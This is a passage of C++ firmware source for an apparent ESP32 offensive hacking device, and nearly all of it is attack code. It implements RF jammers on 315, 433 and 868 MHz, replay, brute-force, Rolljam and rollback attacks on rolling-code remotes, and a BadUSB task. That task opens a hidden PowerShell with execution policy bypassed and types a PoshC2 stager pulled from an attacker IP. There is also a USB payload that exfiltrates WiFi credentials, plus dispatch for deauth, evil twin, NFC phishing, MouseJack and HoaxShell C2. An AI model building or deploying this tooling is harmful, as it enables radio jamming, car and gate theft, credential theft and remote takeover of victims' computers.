        Keyboard.releaseAll();
        delay(500);
        
        // Get obfuscated payload
        String payload = PayloadManager::getExfilPayload(ip);
        
        Keyboard.print(payload);
        delay(500);
        Keyboard.press(KEY_RETURN);
        Keyboard.releaseAll();
        
        Serial.println("[USB] Exfil payload injected! Check /exfil/wifi_creds.xml");
        speak(TTS_SUCCESS);
        
    } else {
        // Generic BadUSB - specific impl or DuckyScript reader
        // For now just a demo typing
        Keyboard.print("Hello from Monster S3 BadUSB!");
    }
    
    // Keep task alive to keep USB active? or end?
    // Usually we can just loop or end if USB handles itself.
    // For now, loop to prevent task deletion crash if needed
    while(!stop_requested) {
        delay(1000);
    }
    
    #else
    Serial.println("[USB] ERROR: Native USB not enabled or not supported!");
    speak(TTS_FAIL);
    #endif
    
    vTaskDelete(NULL);
}

// ============================================================================
// RF ATTACK TASKS (Using rf_core)
// ============================================================================

/**
 * @brief Attack Task: RF Jammer (433MHz Continuous)
 * @param pvParameters FreeRTOS parameters
 */
static void task_rf_jammer_433(void *pvParameters) {
    Serial.println("[ATTACK] Starting RF Jammer 433MHz...");
    speak(TTS_ATTACK_START);
    set_module_power(1);
    
    RFCore::startJammerContinuous(FREQ_433);
    
    while(!stop_requested) { 
        RFCore::updateJammer();
    }
    
    RFCore::stopJammer();
    set_module_power(0);
    vTaskDelete(NULL);
}

static void task_rf_jammer_315(void *pvParameters) {
    set_module_power(1);
    speak(TTS_ATTACK_START);
    RFCore::startJammerContinuous(FREQ_315);
    while(!stop_requested) RFCore::updateJammer();
    RFCore::stopJammer();
    set_module_power(0);
    vTaskDelete(NULL);
}

static void task_rf_jammer_868(void *pvParameters) {
    set_module_power(1);
    speak(TTS_ATTACK_START);
    RFCore::startJammerContinuous(FREQ_868);
    while(!stop_requested) RFCore::updateJammer();
    RFCore::stopJammer();
    set_module_power(0);
    vTaskDelete(NULL);
}

static void task_rf_jammer_burst(void *pvParameters) {
    set_module_power(1);
    speak(TTS_ATTACK_START);
    RFCore::startJammerBurst(FREQ_433, 100, 50);
    while(!stop_requested) RFCore::updateJammer();
    RFCore::stopJammer();
    set_module_power(0);
    vTaskDelete(NULL);
}

static void task_rf_jammer_smart(void *pvParameters) {
    set_module_power(1);
    speak(TTS_ATTACK_START);
    RFCore::startJammerSmart(FREQ_433);
    while(!stop_requested) RFCore::updateJammer();
    RFCore::stopJammer();
    set_module_power(0);
    vTaskDelete(NULL);
}

/**
 * @brief Attack Task: RF Signal Capture
 * @param pvParameters FreeRTOS parameters
 */
static void task_rf_capture(void *pvParameters) {
    Serial.println("[ATTACK] Starting RF Capture...");
    speak(TTS_ATTACK_START);
    set_module_power(1);
    
    RFCore::startReceive(FREQ_433);
    
    while(!stop_requested) { 
        if (RFCore::hasSignal()) {
            CapturedSignal sig = RFCore::getLastCapture();
            Serial.printf("[RF] Captured: %d bytes, RSSI: %d, Proto: %s\n",
                         sig.rawLength, sig.rssi, RFCore::getProtocolName(sig.protocol));
            
            char filename[32];
            snprintf(filename, sizeof(filename), "/subghz/cap_%lu.sub", millis());
            RFCore::saveFlipperFormat(filename, &sig);
            speak(TTS_SUCCESS);
        }
        delay(10);
    }
    
    RFCore::stopReceive();
    set_module_power(0);
    vTaskDelete(NULL);
}

/**
 * @brief Attack Task: RF Replay (Last Capture)
 * @param pvParameters FreeRTOS parameters
 */
static void task_rf_replay(void *pvParameters) {
    speak(TTS_ATTACK_START);
    set_module_power(1);
    
    if (!RFCore::replayLast()) {
        Serial.println("[ATTACK] No signal to replay!");
        speak(TTS_FAIL);
    } else {
        speak(TTS_SUCCESS);
    }
    
    set_module_power(0);
    vTaskDelete(NULL);
}

static void task_rf_ghost(void *pvParameters) {
    speak(TTS_ATTACK_START);
    set_module_power(1);
    
    RFCore::startGhostReplay(8000, 45000, 10);
    
    while(!stop_requested && RFCore::isGhostActive()) { 
        delay(100);
    }
    
    RFCore::stopGhostReplay();
    set_module_power(0);
    vTaskDelete(NULL);
}

static void task_rf_brute(void *pvParameters) {
    speak(TTS_ATTACK_START);
    set_module_power(1);
    
    RFCore::startBruteForce(FREQ_433, 12, PROTO_CAME);
    
    while(!stop_requested && RFCore::isBruteForcing()) { 
        RFCore::updateBruteForce();
        
        if (RFCore::getBruteProgress() % 100 == 0) {
            Serial.printf("[RF] Brute: %lu/%lu (%.1f%%)\n",
                         RFCore::getBruteProgress(),
                         RFCore::getBruteTotal(),
                         (float)RFCore::getBruteProgress() / RFCore::getBruteTotal() * 100);
        }
    }
    
    RFCore::stopBruteForce();
    set_module_power(0);
    vTaskDelete(NULL);
}

static void task_rf_spectrum(void *pvParameters) {
    speak(TTS_ATTACK_START);
    set_module_power(1);
    
    RFCore::startFrequencyScan(430.0f, 440.0f, 0.1f);
    
    while(!stop_requested) { 
        RFCore::updateScanner();
        float strongest = RFCore::findStrongestFrequency();
        Serial.printf("[RF] Strongest @ %.2f MHz\n", strongest);
        delay(500);
    }
    
    RFCore::stopFrequencyScan();
    set_module_power(0);
    vTaskDelete(NULL);
}

/**
 * @brief Attack Task: RF Rolljam (Jam & Capture)
 * @param pvParameters FreeRTOS parameters
 */
static void task_rf_rolljam(void *pvParameters) {
    speak(TTS_ATTACK_START);
    set_module_power(1);
    
    RFCore::startRolljam(FREQ_433);
    
    while(!stop_requested) { 
        RFCore::updateRolljam();
        
        // Report success if code captured
        static uint8_t lastCount = 0;
        uint8_t count = RFCore::getRollingCodeBuffer()->codeCount;
        if (count > lastCount) {
             speak(TTS_SUCCESS);
             lastCount = count;
        }
    }
    
    RFCore::stopRolljam();
    set_module_power(0);
    vTaskDelete(NULL);
}

/**
 * @brief Attack Task: RF Rollback (Sequence Reply)
 * @param pvParameters FreeRTOS parameters
 */
static void task_rf_rollback(void *pvParameters) {
    speak(TTS_ATTACK_START);
    set_module_power(1);
    
    // Start smart capture with -80dBm threshold
    RFCore::startRollbackSmart(FREQ_433, -80);
    
    uint8_t target_codes = 3;  // Aim for 3 codes for a solid rollback
    bool attack_executed = false;
    
    while(!stop_requested) { 
        RFCore::updateRollback();
        
        // Report progress
        static uint8_t lastCount = 0;
        uint8_t count = RFCore::getRollingCodeBuffer()->codeCount;
        
        if (count > lastCount) {
             speak(TTS_SUCCESS); // "Signal Captured" beep equivalent
             Serial.printf("[ATTACK] Rollback: %d/%d sentinels captured\n", count, target_codes);
             lastCount = count;
        }
        
        // Check triggers
        if (!attack_executed && count >= target_codes) {
             Serial.println("[ATTACK] Target codes reached! Preparing to execute...");
             speak(TTS_SUCCESS); 
             delay(1000); // Give user a moment
             
             // Execute Sequence
             if (RFCore::executeRollbackAttack()) {
                 speak(TTS_SUCCESS);
                 Serial.println("[ATTACK] Rollback Sequence executed.");
             } else {
                 speak(TTS_FAIL);
             }
             
             // Reset for next car or stop?
             // For now, reset buffer to allow continuous usage
             // RFCore::startRollbackSmart(FREQ_433, -80);
             // lastCount = 0;
             
             // Or just flag as done to prevent loop
             attack_executed = true; 
        }
        
        delay(10);
    }
    
    RFCore::stopRollback();
    set_module_power(0);
    vTaskDelete(NULL);
}

// ============================================================================
// POSHC2 ATTACK TASKS
// ============================================================================

/**
 * @brief Attack Task: PoshC2 Payload Execution
 * @param pvParameters FreeRTOS parameters
 */
static void task_posh_c2(void *pvParameters) {
    Serial.println("[ATTACK] Starting PoshC2 Payload...");
    speak(TTS_ATTACK_START);
    
    #if ARDUINO_USB_MODE
    Serial.println("[USB] Initializing USB HID...");
    USB.begin();
    Keyboard.begin();
    delay(2000); // Wait for enumeration
    
    // Open PowerShell as Admin (GUI + X, then A) or just GUI + R powershell
    Keyboard.press(KEY_LEFT_GUI);
    Keyboard.press('r');
    delay(100);
    Keyboard.releaseAll();
    delay(500);
    
    Keyboard.print("powershell -NoP -NonI -W Hidden -Ep Bypass");
    delay(100);
    Keyboard.press(KEY_RETURN);
    Keyboard.releaseAll();
    delay(2000); // Wait for PS
    
    // Smart Drive Detection & Execution Payload (Staged via /p/posh)
    // 1. Download Loader Script (Stage 1) from ESP32
    // 2. Execute it in memory
    
    // Note: We need the attacker IP for the URL
    const char* ip = config_get()->attacker_ip;
    String payload = PayloadManager::getPoshC2Stager(ip);
                         
    Keyboard.print(payload);
    delay(500);
    Keyboard.press(KEY_RETURN);
    Keyboard.releaseAll();
    
    Serial.println("[PoshC2] Payload injected. Scripts should be loaded in target PS session.");
    speak(TTS_SUCCESS);
    
    // Keep alive
    while(!stop_requested) delay(1000);
    
    #else
    Serial.println("[POSHC2] USB not supported!");
    speak(TTS_FAIL);
    #endif
    
    vTaskDelete(NULL);
}

// ============================================================================
// MANAGER FUNCTIONS
// ============================================================================

/**
 * @brief Initialize the Attacks Manager
 * Sets up default states and hardware dependencies
 */
void attacks_init() {
    stop_requested = false;
    current_attack = ATTACK_NONE;
    attack_task_handle = NULL;
    packets_sent = 0;
    
    RFCore::init();
    
    Serial.println("[ATTACKS] Manager Initialized (All Attacks Real)");
}

/**
 * @brief Stop any running attack
 * Signals tasks to stop, cleans up resources, and powers down modules
 */
void attacks_stop() {
    if (current_attack == ATTACK_NONE) return;
    
    stop_requested = true;
    delay(200);
    
    if (attack_task_handle != NULL) {
        vTaskDelete(attack_task_handle);
        attack_task_handle = NULL;
    }
    
    RFCore::stopJammer();
    RFCore::stopReceive();
    RFCore::stopGhostReplay();
    RFCore::stopBruteForce();
    RFCore::stopGhostReplay();
    RFCore::stopBruteForce();
    RFCore::stopFrequencyScan();
    RFCore::stopRolljam();
    RFCore::stopRollback();
    
    NRF24Attacks::stop();
    
    esp_wifi_set_promiscuous(false);
    WiFi.mode(WIFI_OFF);
    NimBLEDevice::deinit();
    
    set_module_power(0);
    current_attack = ATTACK_NONE;
    
    Serial.println("[ATTACKS] Stopped");
}

/**
 * @brief Start a specific attack
 * Stops current attack if needed, then launches new attack task
 * @param type The AttackType enum to start
 */
void attacks_start(AttackType type) {
    if (current_attack == type) return;
    
    attacks_stop();
    stop_requested = false;
    current_attack = type;
    
    Serial.printf("[ATTACKS] Starting: %s\n", attacks_get_name(type));
    
    switch (type) {
        // BLE
        case ATTACK_BLE_SPAM:
            xTaskCreate(task_ble_spam_br, "BLE_Spam", 8192, NULL, 3, &attack_task_handle);
            break;
        case ATTACK_BLE_SOUR_APPLE:
            xTaskCreate(task_ble_sour_apple, "Sour_Apple", 8192, NULL, 3, &attack_task_handle);
            break;
        case ATTACK_BLE_SWIFT_PAIR:
            xTaskCreate(task_ble_swift_pair, "Swift_Pair", 8192, NULL, 3, &attack_task_handle);
            break;
        case ATTACK_BLE_FAST_PAIR:
            xTaskCreate(task_ble_fast_pair, "Fast_Pair", 8192, NULL, 3, &attack_task_handle);
            break;
            
        // WiFi
        case ATTACK_WIFI_DEAUTH:
            xTaskCreate(task_wifi_deauth, "WiFi_Deauth", 8192, NULL, 4, &attack_task_handle);
            break;
        case ATTACK_WIFI_BEACON_SPAM:
            xTaskCreate(task_wifi_beacon_spam, "Beacon_Spam", 8192, NULL, 3, &attack_task_handle);
            break;
        case ATTACK_WIFI_EVIL_TWIN:
            xTaskCreate(task_wifi_evil_twin, "Evil_Twin", 8192, NULL, 3, &attack_task_handle);
            break;
        case ATTACK_WIFI_PMKID:
            xTaskCreate(task_wifi_pmkid, "PMKID", 8192, NULL, 3, &attack_task_handle);
            break;
        case ATTACK_WIFI_WARDRIVE:
            xTaskCreate(task_wifi_wardrive, "Wardrive", 8192, NULL, 2, &attack_task_handle);
            break;
            
        // RF
        case ATTACK_RF_JAMMER_433:
            xTaskCreate(task_rf_jammer_433, "RF_Jam433", 4096, NULL, 5, &attack_task_handle);
            break;
        case ATTACK_RF_JAMMER_315:
            xTaskCreate(task_rf_jammer_315, "RF_Jam315", 4096, NULL, 5, &attack_task_handle);
            break;
        case ATTACK_RF_JAMMER_868:
            xTaskCreate(task_rf_jammer_868, "RF_Jam868", 4096, NULL, 5, &attack_task_handle);
            break;
        case ATTACK_RF_JAMMER_BURST:
            xTaskCreate(task_rf_jammer_burst, "RF_JamBurst", 4096, NULL, 5, &attack_task_handle);
            break;
        case ATTACK_RF_JAMMER_SMART:
            xTaskCreate(task_rf_jammer_smart, "RF_JamSmart", 4096, NULL, 5, &attack_task_handle);
            break;
        case ATTACK_RF_CAPTURE:
        case ATTACK_RF_SCAN:
            xTaskCreate(task_rf_capture, "RF_Cap", 4096, NULL, 4, &attack_task_handle);
            break;
        case ATTACK_RF_REPLAY:
            xTaskCreate(task_rf_replay, "RF_Replay", 4096, NULL, 4, &attack_task_handle);
            break;
        case ATTACK_RF_GHOST_REPLAY:
            xTaskCreate(task_rf_ghost, "RF_Ghost", 4096, NULL, 4, &attack_task_handle);
            break;
        case ATTACK_RF_BRUTE_FORCE:
        case ATTACK_RF_DEBRUIJN:
            xTaskCreate(task_rf_brute, "RF_Brute", 4096, NULL, 4, &attack_task_handle);
            break;
        case ATTACK_RF_SPECTRUM:
            xTaskCreate(task_rf_spectrum, "RF_Spec", 4096, NULL, 3, &attack_task_handle);
            break;
        case ATTACK_RF_ROLLJAM:
            xTaskCreate(task_rf_rolljam, "RF_Rolljam", 4096, NULL, 4, &attack_task_handle);
            break;
        case ATTACK_RF_ROLLBACK:
            xTaskCreate(task_rf_rollback, "RF_Rollback", 4096, NULL, 4, &attack_task_handle);
            break;
            
        // NFC
        case ATTACK_NFC_CLONE:
            xTaskCreate(task_nfc_clone, "NFC_Clone", 8192, NULL, 3, &attack_task_handle);
            break;
        case ATTACK_NFC_FAULT:
            xTaskCreate(task_nfc_fault, "NFC_Fault", 8192, NULL, 4, &attack_task_handle);
            break;
        case ATTACK_NFC_PHISHING:
            xTaskCreate(task_nfc_phishing, "NFC_Phish", 8192, NULL, 3, &attack_task_handle);
            break;
            
        // IR
        case ATTACK_IR_TV_OFF:
            xTaskCreate(task_ir_tv_off, "IR_TVBG", 4096, NULL, 2, &attack_task_handle);
            break;
        case ATTACK_IR_BRUTE:
            xTaskCreate(task_ir_brute, "IR_Brute", 4096, NULL, 2, &attack_task_handle);
            break;
        case ATTACK_IR_CLONE:
            xTaskCreate(task_ir_clone, "IR_Clone", 4096, NULL, 2, &attack_task_handle);
            break;
        // NRF24
        case ATTACK_NRF_MOUSEJACK:
            xTaskCreate(task_nrf_mousejack, "MouseJack", 4096, NULL, 3, &attack_task_handle);
            break;
        case ATTACK_NRF_KEYBOARD:
            xTaskCreate(task_nrf_keyboard, "NRF_Key", 4096, NULL, 3, &attack_task_handle);
            break;


        // USB
        case ATTACK_USB_BADUSB:
        case ATTACK_USB_WAX:
            xTaskCreate(task_usb_badusb, "BadUSB", 4096, (void*)current_attack, 3, &attack_task_handle);
            break;
        case ATTACK_USB_EXFIL:
            // WiFi Exfiltration Payload (Staged & Obfuscated)
            xTaskCreate(task_usb_badusb, "USB_Exfil", 4096, (void*)ATTACK_USB_EXFIL, 3, &attack_task_handle);
            break;
            
        case ATTACK_POSHC2:
            xTaskCreate(task_posh_c2, "PoshC2", 8192, NULL, 3, &attack_task_handle);
            break;
            
        case ATTACK_HOAXSHELL:
            // HoaxShell is event-driven via Web/HTTP, no RTOS task needed
            // Just set state so the UI knows it's active
            break;
            
        default:
            current_attack = ATTACK_NONE;
            break;
    }
}

bool attacks_is_running() {
    return current_attack != ATTACK_NONE;
}

AttackType attacks_get_current() {
    return current_attack;
}

void attacks_update() {
    // Most logic in dedicated tasks
}

uint32_t attacks_get_packet_count() {
    return packets_sent;
}

void attacks_report_success() {
    Serial.println("[ATTACKS] Success reported");
    speak(TTS_SUCCESS);
}

void attacks_report_fail() {
    Serial.println("[ATTACKS] Fail reported");
    speak(TTS_FAIL);
}

const char* attacks_get_name(AttackType type) {
    switch (type) {
        case ATTACK_NONE: return "None";
        case ATTACK_BLE_SPAM: return "BLE Spam BR";
        case ATTACK_BLE_SOUR_APPLE: return "Sour Apple";
        case ATTACK_BLE_SWIFT_PAIR: return "Swift Pair";
        case ATTACK_BLE_FAST_PAIR: return "Fast Pair";
        case ATTACK_WIFI_DEAUTH: return "WiFi Deauth";
        case ATTACK_WIFI_BEACON_SPAM: return "Beacon Spam";
        case ATTACK_WIFI_EVIL_TWIN: return "Evil Twin";
        case ATTACK_WIFI_PMKID: return "PMKID Capture";
        case ATTACK_WIFI_WARDRIVE: return "Wardriving";
        case ATTACK_RF_JAMMER_433: return "Jammer 433MHz";
        case ATTACK_RF_JAMMER_315: return "Jammer 315MHz";
        case ATTACK_RF_JAMMER_868: return "Jammer 868MHz";
        case ATTACK_RF_JAMMER_BURST: return "Jammer Burst";
        case ATTACK_RF_JAMMER_SMART: return "Jammer Smart";
        case ATTACK_RF_SCAN: return "RF Scan";
        case ATTACK_RF_CAPTURE: return "RF Capture";
        case ATTACK_RF_REPLAY: return "RF Replay";
        case ATTACK_RF_GHOST_REPLAY: return "Ghost Replay";
        case ATTACK_RF_BRUTE_FORCE: return "RF Brute Force";
        case ATTACK_RF_DEBRUIJN: return "De Bruijn";
        case ATTACK_RF_SPECTRUM: return "Spectrum";
        case ATTACK_RF_ROLLJAM: return "Rolljam";
        case ATTACK_RF_ROLLBACK: return "Rollback";
        case ATTACK_NFC_CLONE: return "NFC Clone";
        case ATTACK_NFC_FAULT: return "NFC Fault";
        case ATTACK_NFC_PHISHING: return "NFC Phishing";
        case ATTACK_POSHC2: return "PoshC2 Framework";
        case ATTACK_IR_BRUTE: return "IR Brute";
        case ATTACK_IR_TV_OFF: return "TV-B-Gone";
        case ATTACK_IR_CLONE: return "IR Clone";
        case ATTACK_NRF_MOUSEJACK: return "MouseJack";
        case ATTACK_NRF_KEYBOARD: return "NRF Sniffer";
        case ATTACK_USB_BADUSB: return "BadUSB";
        case ATTACK_USB_WAX:    return "WAX Attack (NTLM)";
        case ATTACK_USB_EXFIL:  return "USB Exfil";
        case ATTACK_HOAXSHELL:  return "HoaxShell C2";
        default: return "Unknown";
    }
}
